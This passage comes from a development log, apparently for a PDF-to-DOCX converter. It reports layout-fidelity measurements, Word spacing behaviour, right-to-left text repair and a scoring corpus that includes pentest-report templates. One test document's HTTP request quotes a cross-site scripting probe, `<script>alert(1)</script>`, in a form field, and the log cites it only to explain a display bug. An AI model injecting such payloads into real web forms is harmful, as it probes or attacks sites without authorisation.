14 pt apart by the bottom, so a table is drawn below where the PDF has it and
never above. Allowing downward moves cost pages 5 and 11 about 0.03 each and
gave nothing back.

#### Per-page similarity, part five end to part six end

| page | before | after | | page | before | after |
|---|---|---|---|---|---|---|
| 1 | 0.9942 | 0.9942 | | 13 | 0.9751 | 0.9751 |
| 2 | 0.8705 | 0.8704 | | 14 | 0.7890 | **0.8848** |
| 3 | 0.7753 | **0.8782** | | 15 | 0.9256 | **0.9377** |
| 4 | 0.9234 | 0.9232 | | 16 | 0.8813 | **0.9095** |
| 5 | 0.8267 | **0.8408** | | 17 | 0.9281 | **0.9439** |
| 6 | 0.9050 | **0.9175** | | 18 | 0.8811 | **0.9089** |
| 7 | 0.9523 | 0.9521 | | 19 | 0.9280 | **0.9438** |
| 8 | 0.9671 | 0.9671 | | 20 | 0.8828 | **0.9101** |
| 9 | 0.8222 | **0.8553** | | 21 | 0.9279 | **0.9437** |
| 10 | 0.9021 | **0.9029** | | 22 | 0.8009 | **0.8063** |
| 11 | 0.8308 | **0.8365** | | 23 | 0.8527 | **0.9068** |
| 12 | 0.9270 | **0.9283** | | | | |

Nineteen pages up. The three that read as down, 2, 4 and 7, moved by 0.0001
to 0.0002, which is the render rounding to the same page twice.

#### Cost

0.79 s on a 25-page report whose one table has 1,249 rows and 6,420 cells,
against the 376 s pdf2docx spends on the same document. The pass is linear in
rows: 0.067 ms a cell at 250 rows and 0.112 ms at 4,000, which is the sort by
line position and not the walk. It still counts against the fidelity budget
and is skipped with the same warning when the margin is thin.

#### What is still out, inside a table

- **A cell holding two line pitches.** A finding card writes "Vulnerability
  Description" and the paragraph under it as one paragraph of six lines at two
  alternating pitches, and one exact line height cannot be both. The headings
  land exactly and the bodies 2.3 pt low. Same limitation as at the top level.
- **A table whose rows are not the PDF's** keeps the place the converter gave
  it, so its rules stay up to 1.3 pt low. The risk matrix on page 5 is one:
  its rows come out 0.7 pt short each, so no single offset fits them. (Part
  seven measured that table again: its rules land within 0.07 pt of the PDF's,
  centre to centre. The 0.7 pt is the cumulative rounding in its row heights,
  which is under the fit's own half-point tolerance, and it does not reach the
  page.)
- **The block after a table** is still about 0.8 pt low, because Word puts it
  below the border under the table's last row and the PDF centres that rule
  on the row's own edge. Nothing in a DOCX can say otherwise. (Part seven
  measured all 25 such blocks: median +0.12 pt, mean +0.27, and the two over a
  point are both on page 3, which starts 0.65 pt low in its own heading table
  and carries that down the page. The systematic part of this went with the
  spacing-collapse fix.)

### Fidelity, part seven: one paragraph, two leadings

Four commits. `test_convert.py` 218 to **255 checks, 0 FAIL**. Vitest unchanged
at 56 files / 592 tests. Same metric, same defaults (`--line-breaks=pdf`), same
machine, same Word.

**Mean 0.9103 to 0.9145. Median 0.9101 to 0.9175. Worst page unchanged at
0.8063.** Lines more than a point off their PDF baseline: **30 to 11**. Four
pages up, none down, 23 pages, 390 of 390 lines, no fallback, 27
table-of-contents entries, fonts embedded.

The round was meant to be about figures. Page 12's diagram was 7.4 pt out and
page 10's chart 4.0, and the obvious suspect was how a picture is anchored. It
was neither. Reading the line-by-line drift rather than the union of a page's
ink put both numbers on a paragraph instead, and the diagram was within 1.1 pt
the whole time.

#### One line height cannot be two

pdf2docx writes a sub-heading and the paragraph under it as one paragraph with
a line break between them. A Word paragraph has one exact line height for every
line in it, and the report sets those two at different leadings: 19.7 pt under
the heading, 14.8 between two body lines. Whichever number that one height
takes, the lines set at the other leading walk away from the page they came
from, and the pass makes it symmetric on purpose: a block's first baseline is
placed so the residuals straddle zero, so the heading is pulled up as far as
the last line is pushed down.

There is a second cost, and it is the one I did not expect. A block's line
height may not go below its tallest row's own ascent over 0.8, or Word clips
the capitals. A sub-heading's ascent is 13.1 pt, so its floor is 16.4 pt, so
body lines the report set at 14.8 could not have their own leading even in
principle while they shared a paragraph with it.

Five blocks of the reference report, on four pages:

| page | rows | the PDF's leadings | residual, before |
|---|---|---|---|
| 7 | 9 | 22.76 and 15.68, alternating | -3.07 to +3.74 |
| 10 | 6 | 15.68 then 14.83 | -3.10 to +3.95 |
| 11 | 3 | 15.68 then 14.83 | -0.73 to +1.58 |
| 11 | 5 | 15.68 then 14.83 | -2.31 to +3.16 |
| 12 | 4 | 19.68 then 14.83 | -2.44 to +7.29 |

The cut is at the leading change. The smallest gap between two of a block's
baselines is the leading it was set at; anything wider is the space a report
puts between two blocks, and that is where the paragraph becomes two. A line
break becomes a paragraph break, so not one character is added or lost and the
text check reads both the same way: it turns a `w:br` and a `w:p` into the same
newline and then squashes whitespace out.

Part three built this and took it out, because splitting a block moved the
tables under it by 12.3 pt. The reason was worth finding. The pass keeps a
table where the converter put it by walking the converter's own heights
alongside its corrected ones, and a structural change broke that second walk.
The cure is arithmetic rather than bookkeeping: the first piece keeps the
spacing before, the last keeps the spacing after, the seams get none, and every
piece keeps the line height, so the pieces come to exactly the number of points
the one paragraph came to. The second walk then reaches the same place, and a
page cannot grow even if nothing is placed afterwards. A piece the layout pass
does not go on to place is joined back up rather than left with nothing above
it.

#### Word keeps the larger of two spacings

Cutting page 12's paragraph fixed its lines and cost the page 0.024, which is
what sent me looking. The model said the heading's baseline would land at 86.10
and Word drew it at 83.30; three patched renders of the same file disagreed
about where the error was, which meant the model was wrong rather than the
spacing.

It was one line of the model. The spacing after one paragraph and the spacing
before the next do not add up. Word keeps the larger and discards the other.
Twelve cases, one per page, both values stated and neither inherited:

| after | before | Word's gap | sum | larger |
|---|---|---|---|---|
| 10.0 | 10.0 | 10.00 | 20.0 | 10.0 |
| 12.0 | 4.0 | 11.92 | 16.0 | 12.0 |
| 4.0 | 12.0 | 11.92 | 16.0 | 12.0 |
| 9.0 | 6.0 | 8.92 | 15.0 | 9.0 |
| 5.0 | 20.0 | 19.88 | 25.0 | 20.0 |

Every one landed on the larger within 0.12 pt. Part four wrote the opposite
down and was not so much wrong as unlucky: in each of its cases one of the two
was zero, and there the two rules agree. On this report the converter writes a
non-zero spacing after in one place, the empty run-up paragraph that opens a
page, and there lowering the next block's spacing before did nothing at all
until the one above gave its own back.

#### A table is the rectangle the PDF drew for it

With the model corrected, page 12's text landed and its diagram did not: it
went to 3.8 pt above the PDF, because it had been sitting where two errors
cancelled. The existing correction could not help. It fits a table's row
boundaries against the rules the PDF drew across the same span, and the diagram
is one row with no rules inside it; it also only ever moves a table up.

The diagram does have a rectangle: 79.20 to 532.80 wide, 324.00 tall. So does
the table the converter built for it, to the twentieth of a point. A table
whose left edge, right edge and height are all one of the page's rectangles is
that rectangle, and the PDF says where its top goes. Three sides agreeing is
enough to move it in either direction, which the fit against rules is not
allowed to do: a box states its own top, while a rule only says that something
lines up there and the wrong rule lines up just as well. Two rectangles that
both fit and disagree about the offset are no evidence, so there the table
keeps its place.

#### Per page

| page | before | after | | page | before | after |
|---|---|---|---|---|---|---|
| 1 | 0.9942 | 0.9942 | | 13 | 0.9751 | 0.9751 |
| 2 | 0.8704 | 0.8704 | | 14 | 0.8848 | 0.8848 |
| 3 | 0.8782 | 0.8782 | | 15 | 0.9377 | 0.9377 |
| 4 | 0.9232 | 0.9232 | | 16 | 0.9095 | 0.9095 |
| 5 | 0.8408 | 0.8408 | | 17 | 0.9439 | 0.9439 |
| 6 | 0.9175 | 0.9175 | | 18 | 0.9089 | 0.9089 |
| 7 | 0.9521 | **0.9641** | | 19 | 0.9438 | 0.9438 |
| 8 | 0.9671 | 0.9671 | | 20 | 0.9101 | 0.9101 |
| 9 | 0.8553 | 0.8553 | | 21 | 0.9437 | 0.9437 |
| 10 | 0.9029 | **0.9238** | | 22 | 0.8063 | 0.8063 |
| 11 | 0.8365 | **0.8913** | | 23 | 0.9068 | 0.9068 |
| 12 | 0.9283 | **0.9363** | | | | |

Four up, nineteen identical to four decimal places, none down. Page 11 is the
biggest single move any page has made in seven rounds of this.

#### The two older targets, measured again

Both of the things part six wrote down as remaining turned out to be smaller
than they read.

**Page 5's risk matrix.** Its rows are declared 19.7 and 19.8 pt against the
PDF's 19.76, which is 0.16 pt of drift over six rows and well inside the fit's
own half-point tolerance, so the fit accepts staying still rather than declining
to move. Measured on the render, its rules land 0.07 pt from the PDF's, centre
to centre. Nothing to fix.

**The block after a table.** All 25 of them: median +0.12 pt, mean +0.27, and
the two over a point are both on page 3, whose own first block is a heading
table that starts 0.65 pt low and carries that down the page. The systematic
0.8 pt went with the spacing-collapse fix, which is where it came from.

#### The fallback got a rung below itself

A safety review of part six pointed out that the fallback had outgrown its own
comment. It turns the header, footer and table-of-contents repairs off and
converts again, on the stated ground that the decoration cannot lose text; by
part six the decoration rebuilt a run of code into a table, cropped pictures,
broke lines and moved blocks, tables and the text inside cells, and part seven
added cutting a paragraph in two. So there is now a third rung that converts
once more and decorates at a level that rearranges nothing: shading where a
panel would have been built, no crop, no break, no cut, nothing placed. It says
so in a warning, and it is budgeted like the rung above it. A test vandalises
the table pass on the 120-row table document, which has neither a band nor a
table of contents, so that rung is the only one left to save the line.

#### What is still out

- **A cell holding two line pitches.** The cut works on a top-level paragraph,
  where a block's PDF rows are known from the same pairing the layout pass
  uses. Inside a table cell the rows are only known once the grid has been
  anchored, which happens in the middle of the walk, so the same fix there
  needs the cut to run from inside the walk and to be undoable per page. A
  finding card's bodies are still 2.3 pt low in the middle for this reason.
  (Part eight: done. The cut runs at the top of `place_cell`, where the anchor
  is already known, and the seams join the ones the pre-pass made.)
- **Two lines the PDF sets closer than Word's boxes allow.** An exact line box
  puts 0.8 of its height above the baseline and 0.2 below, so two blocks need
  at least 0.2 of the first plus 0.8 of the second between their baselines.
  Page 4 asks for 17.0 pt where the two boxes need 19.6, and shortening them is
  bounded by the ascent floor. Six blocks on two pages, up to 2.0 pt. A DOCX
  cannot express it: there is no way to say "this box is 19.6 pt tall but sits
  2.6 higher than that implies".
- **Justification and glyph positions**, as in every round since part one. Page
  22 is still the worst page at 0.8063 and almost all of it is that.
- **A badge two tables deep** on a finding card, 1.6 pt low, for the reason
  part six gave: its row is already shorter than the line box inside it.
- **The heading table that opens a page** is 0.65 pt low, so pages 3 and 4
  carry that down. It is the same family as the cell-border inset part six
  measured and not the same number, so a term in that model is still missing.
  (Part eight: there is no missing term. The 0.65 is the average of two cells
  of one heading that Word draws 1.25 pt apart, and reading a page as rows
  rather than columns hid that. Closed.)

### Fidelity, part eight: two cells, one baseline

Three commits. `test_convert.py` 255 to **268 checks, 0 FAIL**. Vitest unchanged
at 56 files / 592 tests. Same metric, same defaults (`--line-breaks=pdf`), same
machine, same Word, and Word itself reports **23 pages**, which is the number
that matters.

**Mean 0.9145 to 0.9151. Median 0.9175 to 0.9176. Worst page 0.8063 to
0.8106.** Five pages up, eighteen unchanged, none down. 390 of 390 lines, no
fallback, 27 table-of-contents entries, fonts embedded.

This is the round where the returns stopped. It is written down anyway, because
two of its three findings were mis-stated in earlier rounds and the third is a
measurement that says a whole avenue is closed.

#### The 0.65 pt in the heading model was 1.25 pt between two cells

Six rounds called the section heading at the top of a page "0.65 pt low" and
blamed a missing term in the model of where a cell's first line sits. It was
neither 0.65 nor a model error.

A heading arrives as a one-row table of two cells, the number in one and the
title in the other, and the two carry different exact line heights: 25.2 pt
against 23.65. Word draws each cell's first baseline from its own cell's
height, so it put the number 1.25 pt below the title where the PDF has both on
one line. Reading a page's text as rows merges the two into one and reports the
average, which is where 0.65 came from.

The number was never corrected because a cell is paired with the PDF through
its text and "2." squashes to "2", which is shorter than the comparison's own
minimum and occurs all over a report. Inside a cell, though, the pairing is not
really by text: the lines were dropped into the cell by where their centres
fall. A cell holding one paragraph with text, with one line in it and nothing
placed yet, has nothing left to match, and the two are each other's. Two
paragraphs, two lines, a nested table or anything already placed is refused.

Eight headings and, it turned out, four more single-line cells. Page 22 gained
most of anything this round: 0.8063 to 0.8106.

#### The cut reached inside a cell

Part seven cut a paragraph where the report changed its leading, at the top
level only, because a cell's rows are known only once the table's grid has been
anchored, which happens in the middle of the page's walk, and the walk runs
twice with a restore between that puts spacing back and knows nothing about
structure.

The way in is that the anchor is known by the time the cell is reached, and the
cell's own lines are already in hand there. So the cut runs at the top of
`place_cell`, once, before the cell is walked: the walk then sees the pieces and
never a paragraph changing under it. Running the walk again is harmless, because
a piece has one leading and nothing left to cut, and because the pieces come to
exactly the points the paragraph came to, so the second walk's reading of the
converter's own heights is unchanged. The seams join the ones the top-level
pre-pass made, so the existing rule covers them: a piece the pass did not go on
to place is joined back up, which is also what gives a table back whole when one
of its cells would not fit.

The finding card writes four sub-headings and their paragraphs as one block of
seven lines, at 13.48 pt inside a pair and 18.05 between two of them, so three
of the seven sat 2.3 pt low. Page 14 0.8848 to 0.8923.

#### Page 22 is not glyph positions

Every round since the first has written "justification and glyph positions" next
to page 22 and left it there. Measured, over the 40 lines of it that pair:

| | median | mean | worst |
|---|---|---|---|
| where the line starts | +0.00 | +0.13 | 3.00 |
| where the line ends | -0.09 | -4.84 | 34.42 |
| a word's place inside the line | +0.09 | +5.43 | 34.37 |
| a word's own width | +0.11 | +0.10 | 0.19 |

The words are the right width to within a fifth of a point, and the lines start
in the right place. The whole of the difference is the space between words: the
PDF justifies those paragraphs and the Word file does not, so its lines end up
to 34 pt short of the margin the PDF reaches.

That is a fixable-sounding thing, and it was tried three ways.

**Justify them.** Word does justify a line that ends in a manual line break,
which was worth knowing: the line ends went from a mean of -4.84 to +0.27 at
the median. The page still got worse, 0.8106 to 0.8010, because Word hands out
the slack differently from typst, so the words in the middle of a line move
further than they did when the line was simply short, and because the paragraph
carries a widened column (the relief that stops a forced line wrapping twice),
which a justified line then fills.

**Justify them and take the relief away.** Pages 5 and 9 collapsed, 0.8415 to
0.5755 and 0.8558 to 0.7306, because a forced line Word measures a hair wider
than typst did wraps again and takes the rest of the page with it. The relief
is not decoration.

**Per-line character spacing**, which Word honours in twentieths of a point.
Built as an oracle that reads how much each line needs from the render Word had
already produced, which the converter itself could never know. Page 22 alone:
0.8106 to 0.8180. The whole report: 0.9151 to **0.9148**. Even with information
no implementation can have, it does not pay, because tracking a line to the
right length moves every glyph in it while typst moved only the spaces.

So it stays as it is, and the reason is now a measurement rather than a guess.

#### What is still out, precisely

Twenty-one of 545 paired columns sit more than 0.95 pt off. One of those is not
real: page 10's chart is rasterised, so the PDF's legend words have no
counterpart in the Word file and the comparison paired one of them with the same
word elsewhere on the page.

1. **Two lines the PDF sets closer than two Word boxes fit** (10 columns, pages
   4, 14, 16, 18, 20; 1.5 to 2.5 pt). An exact line box puts the baseline at 0.8
   of its height, and the box may not be shorter than the line's own ink ascent
   over 0.8 or Word clips the top of it. Two consecutive lines therefore need at
   least 0.2 of the first box plus 0.8 of the second between their baselines. The
   card writes `{{TECHNIQUE}}` under `TECHNIQUES` at a 10.98 pt pitch with ink
   reaching 10.29 pt above the baseline, which asks for boxes of 12.86. A DOCX
   has no way to say "this box is 12.86 pt tall and sits 1.9 pt higher than that
   implies".
2. **A cell whose only line cannot come up far enough** (3 columns, pages 9 and
   22; 1.2 to 1.3 pt). Same arithmetic one level down: the cell's top border plus
   the shortest box its own ink allows already puts the line below where the PDF
   has it.
3. **The blocks under page 3's timeline table** (1 column over the threshold at
   1.57 pt, plus its caption at 1.08). The table is moved onto the rules the PDF
   drew for it and Word ends it about 1.1 pt below where the model says, so the
   caption and the heading under it inherit that. Taking the move away costs the
   page 0.06, so it stays.
4. **Two counts in page 10's risk table**, 1.18 and 1.39 pt, the same family as 2.
5. **Justification**, above: the largest thing left and the one with three
   measured attempts against it.
6. **Under a point, on every page**: the running header sits 0.60 pt low and the
   footer's page number 0.80, which is the band paragraph's own line box against
   the distance Word reserves for it. At the width the metric scores, 0.8 pt is a
   fifth of a pixel.

#### Measured and reverted

- Justifying every multi-line paragraph: mean 0.9151 to 0.9106.
- Deciding a paragraph's alignment once rather than once per line, which is the
  correct reading of the pass and still made it worse: 0.9151 to 0.9142, because
  the runs it newly justified then filled the widened column.
- The same, with the relief removed from justified paragraphs: 0.9151 to 0.8980.
- Oracle per-line character spacing over the whole report: 0.9151 to 0.9148.
- Dropping the fit that moves a table onto the PDF's rules, on the theory that
  part seven's corrected flow had made it redundant: 0.9151 to **0.9070**. It is
  worth 0.06 on page 3 alone.

### Fidelity, part nine: other people's documents

Eight rounds, one document. Every number above was measured on the CPTC report,
and every pass in `convert.py` was tuned until that report looked right. The
export is going to be handed memos, papers, other people's pentest templates
and Arabic, and the fallback ladder protects text and nothing else, so a pass
that places blocks badly in someone else's layout would ship without a word. I
had no way to say whether the passes helped anywhere else, did nothing, or made
things worse than plain pdf2docx would have.

So this round built the other twelve documents and a scorecard, and measured
before changing anything.

#### The corpus and the rule

`server/typst/pdf-to-docx/corpus/` holds twelve documents in four categories:
plain (a memo, a letter, a CV), academic (an IEEE paper, a thesis chapter,
lecture notes), pentest (a findings report, an assessment with a landscape
risk matrix, an executive letter) and right-to-left (an Arabic report section,
Hebrew with English mixed in, and an English report quoting Arabic inside a
code panel and a caption). The fonts are OFL and live in `corpus/fonts/`. The
owner's report is the thirteenth and is never committed; the scorecard takes
its PDF and its fonts folder as arguments.

`scorecard.py` compiles each one, converts it twice (the full converter, and
`--raw`, which is pdf2docx with only the font guarantees), renders both
through Word and scores both against the PDF. Every converter change has to
meet six conditions before it is committed:

1. top rung, or a named reason;
2. Word's page count equals the PDF's, or is no further off than raw's;
3. per document, full's mean is at least raw's less 0.002 (over the pages the
   two have in common, since extra pages are rule 2's business);
4. no page more than 0.02 below the same page in raw;
5. the owner's report keeps at least 0.9146;
6. full takes no more than twice raw's time plus 2 s.

And one habit, which is the point of the whole exercise: a pass that hurts a
shape gets a detector that makes it decline that shape, counted by name in
`result.json` `declined`. It does not get a retuned threshold, because a
threshold is shared by every document, and moving it for one moves it for the
reference too.

#### The baseline

Before any converter change (mean structural similarity per page, full against
raw):

| document | mean full / raw | verdict |
|---|---|---|
| memo | 0.7965 / 0.7689 | pass |
| letter | 0.8442 / 0.8952 | rules 3 and 4 |
| cv | 0.8589 / 0.8559 | pass |
| ieee | 0.6227 / 0.6241 | pass |
| thesis | 0.8538 / 0.7685 | pass |
| notes | 0.8540 / 0.7465 | pass |
| findings | 0.8095 / 0.8085 | rule 1: 9 lines missing, fell back |
| assessment | 0.8587 / 0.8616 | rule 3 |
| exec-letter | 0.7381 / 0.7381 | pass |
| rtl-arabic | 0.7643 / 0.7643 | rule 1: 15 missing |
| rtl-mixed | 0.7906 / 0.7903 | rule 1: 2 missing |
| rtl-in-shapes | 0.8799 / 0.8819 | rule 1: 1 missing |
| reference | 0.9152 / 0.7684 | pass |

Seven of thirteen passed. Letter was the only document where the converter was clearly worse
than doing nothing: 0.05 of mean below raw.

#### Right-to-left, which failed before I looked at it

The one bug I knew about going in was that pdf2docx runs Arabic and Hebrew
words together, and that the text check could not see it because it compares
squashed text, whitespace removed. The plan was to add a word-by-word check,
watch it fail, and fix the spaces.

The first surprise was that all three right-to-left documents already failed
the old check, before the new one existed, for three different reasons:

- PyMuPDF gives each span's characters in reading order, but my own reading of
  the page sorted the spans left to right. For Hebrew that is the line's words
  backwards, with its English terms still forwards, so the old check was
  comparing against a line nobody wrote.
- Typst sets the space between two Hebrew words (Noto Sans Hebrew, a fallback)
  in the main font. PyMuPDF reports that space as a blank span of its own, and
  pdf2docx drops blank spans. That is the known bug, and it also hits Arabic set
  in a fallback font: the rtl-in-shapes caption came out as one word.
- Arabic in one font keeps its real spaces but gains invented ones. Typst writes
  Arabic one glyph per text object, and PyMuPDF guesses spaces from the gaps
  inside words. Reading with `TEXT_INHIBIT_SPACES` keeps the real space glyphs
  and drops every invented one.

So the check now reads a row that holds a right-to-left letter in reading
order, with only the PDF's own space glyphs, and compares it word by word;
every other row is read exactly as before. The repair puts the spaces back,
writes a line pdf2docx left in page order back in reading order, marks runs
`w:rtl` and paragraphs `w:bidi` (in the schema's element order), and mirrors
the paragraph's indents and alignment with the mark. Two of those came from
Word, not from reading: a bare `w:bidi` cost rtl-mixed 0.005 of mean until the
indents were mirrored, because pdf2docx writes them for a left-to-right page,
and `w:rtl` without `w:szCs` cost rtl-in-shapes 0.0012, because a run marked
right to left is set in the complex-script size pdf2docx never writes.

The first version of the reorder had a bug the review caught, and it is the
kind I want written down. It turned round any span it read as right to left,
and a span of digits inside a Hebrew line is one of those, so `2.4.1` came out
as `1.4.2`. The new word-by-word check agreed with it, because it read the PDF
the same way. A text check that shares its reading with the repair cannot catch
the repair. The fix has two halves: the repair never turns digits round (a span
holding a number is left to right, grouped with any English next to it), and a
reorder is refused unless it moves only whole words and numbers, with the same
multiset of characters and the same Latin and numeric tokens on both sides
(`rtl-reorder`). The last rung restructures nothing, so there only whitespace
is rewritten, and a line that would need reordering is counted as
`rtl-reorder-plain-rung` and left as pdf2docx wrote it. A paragraph holding
right-to-left text in which no stretch of runs holds a whole line of the PDF is
not guessed at either (`rtl-respace`): pdf2docx sometimes cuts a line apart,
and a fragment has nothing to be checked against. A test document of
version numbers, an address and a year inside Hebrew now pins that the Word
file reads `2.4.1`, `10.0.0.5` and `2024`, and that a file with `5.0.0.01` in
it is reported missing.

The alignment and line-break passes were built on left-to-right paragraphs and
never measured on anything else, so a run of lines holding right-to-left text
is left where the converter put it (`align-rtl`). That decline stays on under
`--skip=rtl`, which turns off only the repair.

rtl-in-shapes now converts at the top rung. rtl-arabic and rtl-mixed do not,
for reasons inside pdf2docx that are below.

#### The four fixes the rule asked for

Each one was found the same way: `--skip` one pass at a time until the document
cleared, then read what that pass did to it.

- **findings, rule 1.** No pass did it: raw lost the same nine lines. pdf2docx
  read the two-piece footer ("CONFIDENTIAL ... Page 1 of 2") as a borderless
  table and took the table's top from "the block just above it", found by
  walking a list it assumes is in page order. It is not: the page's lines come
  first and the bordered tables it already built are appended after. The
  "block above" was the hosts table far up the page, so the footer's table
  reached up to the finding card's border, was cut into two columns where the
  footer's pieces sit, and every line in between lost the words across the
  cut. The converter now hands that step its blocks sorted
  (`stream_tables_in_page_order`). This one is not a decline: it wraps a
  private pdf2docx method, applies on every rung but `--raw`, and falls through
  to pdf2docx's own step if the blocks cannot be sorted. A check in
  `test_convert.py` asserts that raw pdf2docx still loses the text, so a pdf2docx
  upgrade that fixes it upstream fails that check and says the wrapper can go.
  findings: 0.9204 against raw 0.8085, and 2 Word pages where it had 3.
- **letter, rules 3 and 4.** The rhythm walk could not trust the page top, so
  it anchored on the right-aligned sender's address and assumed that block ends
  where the PDF's rows do. The converter sets its three lines at 13.8 pt where
  the PDF has 14.4, so it ends 1.2 pt away, and every block under it moved 1.3
  pt in Word. A page whose anchor keeps a line height off its PDF pitch keeps
  the converter's spacing (`rhythm-uneven-anchor`). 0.8442 to 0.9018.
- **assessment, rule 3.** The converter wrote "5. Conclusion" and the paragraph
  under it as one block at the paragraph's pitch, and the walk raised the
  block's line height to the heading's ascent, 16.4 pt against 13.7, which
  spread six body lines 2.7 pt apart each. A block of two or more rows whose
  safe height exceeds its PDF pitch, where the converter already wrote that
  pitch, is left alone (`rhythm-tall-row`). The second condition is there
  because a first version without it cost the reference 0.0003: its
  sub-headings have the same excess with a converter height off the pitch, and
  there the walk helps. 0.8587 to 0.8624.
- **rtl-in-shapes, rule 3, unrounded.** It passed by rounding and was 0.000054
  short without it. pdf2docx colours the HTTP request's first three lines
  itself and leaves the body line bare, and the panel pass painted that line
  alone as a second grey stripe. A panel the converter already coloured in part
  is now left to the converter (`panels-partial`).

While in rtl-in-shapes I found a display bug the text check could never see:
the request's last line, `comment=مرحبا بالعالم<script>alert(1)</script>`, is
one run, and the repair marked it `w:rtl`, so Word showed the payload as
`<script>alert(1)</script>بالعالم مرحبا=comment`. Every character was there in
order; only the display was wrong. A run holding letters of both directions is
now left unmarked for Word's own bidi algorithm (`rtl-mixed-run`).

#### Gains, once nothing was below raw

With every document at or above raw, I spent one time-boxed round looking for
gains, stopping when an attempt moved the corpus mean (the mean of the thirteen
full means) by less than 0.002. It started at 0.8287.

The first attempt was worth more than everything else combined. An English
copy of rtl-in-shapes scored 0.8749 against raw 0.9248. The converter writes an
empty paragraph above a page's first heading with 23 pt of spacing after it,
and the heading's own spacing before is 3 pt; Word keeps the larger of the two.
The walk measured the first block's move against the 3 pt alone, read 18 to
23 pt, concluded it had not understood where the page starts, and anchored
further down on a block whose place in Word it can only guess. The move is now
the larger of the two touching spacings after the change less the larger of the
two before it. No threshold moved. memo 0.7965 to 0.8239, notes 0.8573 to
0.8899, rtl-in-shapes 0.8814 to 0.9092, and the corpus mean 0.8287 to 0.8358.
Letter gave back 0.0031 (still 0.0035 over raw), and the reference was
untouched, because every one of its pages already kept the page top as its
anchor.

The third attempt was ieee, the one document still below raw (0.6227 against
0.6241). Only `--skip align` moved it. The pass finds runs of lines that start
at the left edge and sets each paragraph flush left with no first-line indent,
and an IEEE paragraph indents its first line, so the run was its other lines
and the pass zeroed the indent. It now declines a paragraph whose PDF line just
above the run is indented by more than `JUSTIFY_EDGE_PT` and at most
`FIRST_LINE_INDENT_MAX_PT`, a new constant of 36 pt, three ems of 12 pt text
(`align-earlier-line`). Only ieee declines: 0.6227 to 0.6234, still under raw
and inside the tolerance. The corpus moved by 0.00005, so the round stopped.

#### Word's noise

The first measurement said 0.00000, from one pair of renders, and then two
later runs moved raw's side on files whose `document.xml` was byte for byte the
same: one moved letter, rtl-arabic and cv (cv by 0.0155), the other the
reference (0.7684 to 0.7665). So I measured again: three `scorecard.py --noise` runs,
every raw file converted three times and rendered six times in three Word
sessions. The spread of the mean was 0.00000 on all thirteen documents, within
a run and across runs.

The two sessions that did move were not render noise. In one, Word wrote
letter's page 595.13 pt wide instead of 595.32 and set cv with a different word
count, so that session laid the documents out differently. The tolerance stays
at 0.002. Widening it to 0.016 to absorb such a session would let any
regression of that size through rule 3; instead, a verdict that turns on a raw
side moving from its recorded value is re-run before it is believed.

#### Where it ended

| document | mean full / raw | declined | verdict |
|---|---|---|---|
| memo | 0.8239 / 0.7689 | none | pass |
| letter | 0.8987 / 0.8952 | none | pass |
| cv | 0.8589 / 0.8559 | none | pass |
| ieee | 0.6234 / 0.6241 | align-earlier-line 1 | pass |
| thesis | 0.8538 / 0.7685 | rhythm-tall-row 1 | pass |
| notes | 0.8899 / 0.7465 | rhythm-tall-row 1 | pass |
| findings | 0.9204 / 0.8085 | none | pass |
| assessment | 0.8690 / 0.8616 | rhythm-tall-row 3 | pass |
| exec-letter | 0.7381 / 0.7381 | none | pass |
| rtl-arabic | 0.7746 / 0.7643 | align-rtl 3, rtl-reorder-plain-rung 3, rtl-respace 17 | rule 1, named |
| rtl-mixed | 0.7905 / 0.7903 | align-rtl 1, rtl-reorder-plain-rung 6, rtl-respace 11 | rule 1, named |
| rtl-in-shapes | 0.9092 / 0.8819 | panels-partial 1, rtl-mixed-run 1 | pass |
| reference | 0.9152 / 0.7684 | none | pass |

Mean of the thirteen: 0.8143 at baseline, 0.8358 now, against raw's 0.7902.
The reference report is where it was, 0.9152 against a floor of 0.9146, and
its Word file still has 23 pages. Every run is in `corpus/SCORECARD.md`,
newest first.

#### What is still out, precisely

- **rtl-arabic**, rule 1. Two things, both inside pdf2docx's text extraction.
  The Arabic text layer doubles every dotted letter (the body and the dots are
  two glyphs and both map to the letter), so `التنفيذي` reads with its dotted
  letters twice in the PDF's text and in the Word file alike; the converter
  neither adds nor removes them. And pdf2docx's table path drops real letters
  from the Arabic table's cells, four rows of them. That sends the document to
  the last rung, where page-order lines may not be reordered.
- **rtl-mixed**, rule 1. pdf2docx cuts the first Hebrew line into fragments
  around `SQL injection` and `Apache` and writes them as separate paragraphs
  interleaved with the heading. There is no whole line left to repair.
- **ieee**, a Word-free check only: 15 sections for 2 PDF pages, because
  pdf2docx writes a section break every time its two-column detection changes
  its mind down a page. Word draws 2 pages, and the document passes every Word
  rule; full is 0.6234 against raw 0.6241, inside the tolerance.
- **exec-letter** equals raw at 0.7381. Its logo sits in a paragraph whose line
  height is `auto`, which the rhythm walk cannot model, so the walk stops at the
  second block and the page stays 4.3 pt low. And pdf2docx draws its four
  rounded severity boxes as one table with a rule above and below.
- **letter** gave up 0.0031 to the first-move change, though every line in
  Word's PDF is within 0.4 pt of the PDF's vertically, so the loss is not
  vertical placement.
- **cv**: the sidebar's name and title sit 5.2 and 3.1 pt high in full and raw
  alike, which no pass touches.
- **ieee**: three more paragraphs the broad version of the align decline caught,
  worth 0.0004 of mean.

#### What the final review found

The review of the whole branch found the same mistake twice more, in places
the version-number test did not reach.

The first is a number beside Hebrew in an English line. The bidi algorithm
draws a number that follows a Hebrew phrase to the phrase's left, so the page
shows `Server 12 שרת ראשי` whether the source said the number came after the
Hebrew or before it. My reading took the page's order, the repair wrote it into
Word, and the check agreed with it, again because they shared a reading. There
is no better reading to switch to: the information is not on the page. So a
left-to-right line with a number next to its right-to-left words (spaces and
punctuation between them do not count) is read as the page shows it, and the
repair declines it (`rtl-ambiguous-number`). pdf2docx's text stands, and the
check says what it says; for the three lines in `cases.RTL_AMBIGUOUS_NUMBERS`
that is three named missing lines, which is the honest answer.

The second is Arabic-Indic digits. PyMuPDF gives a span's characters in the
order the PDF draws them, and typst draws an Arabic line from the right, digits
included, so `١٢` came back `٢١` and `٥٠٪` came back `٠٥` with the `٪` at the
far end of the span. pdf2docx writes what it reads, so the Word file said 21
where the PDF said 12, and the check, reading the same way, passed it. The
logical reading now sorts each run of digits by its glyphs' left edges, which
is the order a number is read in whatever surrounds it. European digits were
already in that order and do not move. The repair does not try to fix the Word
file's copy: its reorder is refused, since the Latin and numeric tokens differ,
and the check reports the line, so such a document ends on the last rung with
its lines named. The `٪` stays where PyMuPDF put it.

Two smaller things changed what a scorecard row says. `declined` used to add up
every rung a conversion tried, so a document that fell back reported the
declines of files it threw away; it now reports the rung that was kept (plus
`align-rtl`, counted once before any rung), and `--raw` reports none. And
